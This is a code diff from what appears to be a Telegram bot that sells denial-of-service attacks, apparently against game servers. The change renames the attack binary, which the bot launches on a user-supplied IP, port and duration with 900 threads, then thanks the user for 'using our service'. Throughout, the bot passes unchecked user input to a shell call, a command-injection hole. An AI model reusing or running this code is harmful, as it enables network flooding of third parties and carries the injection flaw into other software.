@@ -226,7 +226,7 @@ def bgmi_command(message):
         )
         
         # Log the attack started message
-        logging.info(f"Attack started by {user_name}: ./dark {target_ip} {target_port} {default_duration} 900")
+        logging.info(f"Attack started by {user_name}: ./bgmi {target_ip} {target_port} {default_duration} 900")
 
         # Run the attack command with the default duration and pass the user-provided duration for the finish message
         asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))
@@ -236,7 +236,7 @@ def bgmi_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
     try:
-        command = f"./dark {target_ip} {target_port} {duration} 900"
+        command = f"./bgmi {target_ip} {target_port} {duration} 900"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
         bot.send_message(CHANNEL_ID, f"🎉 𝘼𝙩𝙩𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙊𝙣 {target_ip}:{target_port} 𝙛𝙤𝙧 {user_duration} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨\n\n⚡𝙏𝙝𝙖𝙣𝙠𝙮𝙤𝙪 𝙁𝙤𝙧 𝙐𝙨𝙞𝙣𝙜 𝙊𝙪𝙧 𝙎𝙚𝙧𝙫𝙞𝙘𝙚. 𝙔𝙤𝙪𝙧 𝙄𝙣𝙩𝙚𝙧𝙣𝙚𝙩 𝙄𝙨 𝙉𝙤𝙧𝙢𝙖𝙡 𝙉𝙤𝙬 𝙔𝙤𝙪 𝘾𝙖𝙣 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠⚡")
